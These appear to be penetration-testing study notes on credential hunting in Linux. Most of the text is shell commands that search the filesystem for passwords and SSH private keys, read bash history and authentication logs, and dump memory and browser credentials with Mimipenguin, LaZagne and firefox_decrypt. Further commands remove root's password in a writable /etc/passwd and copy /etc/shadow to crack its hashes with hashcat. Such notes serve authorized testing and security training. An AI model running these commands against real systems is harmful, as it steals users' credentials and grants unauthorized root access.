## delete


# Credential Hunting in Linux
| Files     | History               | Memory                | Key-Rings                  |
|-----------|-----------------------|-----------------------|----------------------------|
| Configs   | Logs                  | Cache                 | Browser stored credentials |
| Databases | Command-line History  | In-memory Processing  |                            |
| Notes     |                       |                       |                            |
| Scripts   |                       |                       |                            |
| Source codes |                    |                       |                            |
| Cronjobs  |                       |                       |                            |
| SSH Keys  |                       |                       |                            |

## Files
Configuration files 	Databases 	Notes
Scripts 	Cronjobs 	SSH keys

### Configuration Files
```bash
$ for l in $(echo ".conf .config .cfg .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#### Credentials in Configuration Files
```bash
$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.

### Databases
```bash
$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

### Notes
```bash
$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts
```bash
$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Cronjobs
```bash
$ cat /etc/crontab
$ ls -la /etc/cron.*/
```

### SSH Keys
### SSH Private Keys
```bash
$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

### SSH Public Keys
```bash
$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
```

### History
#### Bash History
```bash
$ tail -n5 /home/*/.bash*
```

### Logs
Application Logs 	Event Logs 	Service Logs 	System Logs

Log File                | Description
----------------------- | ------------------------------------------------
/var/log/messages       | Generic system activity logs.
/var/log/syslog         | Generic system activity logs.
/var/log/auth.log       | (Debian) All authentication related logs.
/var/log/secure         | (RedHat/CentOS) All authentication related logs.
/var/log/boot.log      | Booting information.
/var/log/dmesg          | Hardware and drivers related information and logs.
/var/log/kern.log       | Kernel related warnings, errors and logs.
/var/log/faillog        | Failed login attempts.
/var/log/cron           | Information related to cron jobs.
/var/log/mail.log       | All mail server related logs.
/var/log/httpd          | All Apache related logs.
/var/log/mysqld.log     | All MySQL server related logs.


```bash
$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

## Memory and Cache
### [Mimipenguin](https://github.com/huntergregal/mimipenguin)
this tool requires administrator/root permissions.
```bash
$ sudo python3 mimipenguin.py
$ sudo bash mimipenguin.sh`
```

### [LaZagne](https://github.com/AlessandroZ/LaZagne)
```bash
$ sudo python2.7 laZagne.py all
```

## Browsers
### Firefox Stored Credentials
```bash
$ ls -l .mozilla/firefox/ | grep default
$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

### (Decrypting Firefox Credentials)[https://github.com/unode/firefox_decrypt]
```bash
$ python3.9 firefox_decrypt.py`
```

### Browsers - LaZagne
```bash
$ python3 laZagne.py browsers`
```

# Passwd, Shadow & Opasswd
## Passwd File
Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.

### Editing /etc/passwd - Before
root:x:0:0:root:/root:/bin/bash

### Editing /etc/passwd - After
root::0:0:root:/root:/bin/bash

Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.

## Opasswd
The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

```
$ sudo cat /etc/security/opasswd
```

Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.

## Cracking Linux Credentials
### Unshadow
```
$ sudo cp /etc/passwd /tmp/passwd.bak 
$ sudo cp /etc/shadow /tmp/shadow.bak 
$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

### Hashcat - Cracking Unshadowed Hashes
```
$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

### Hashcat - Cracking MD5 Hashes
```
$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```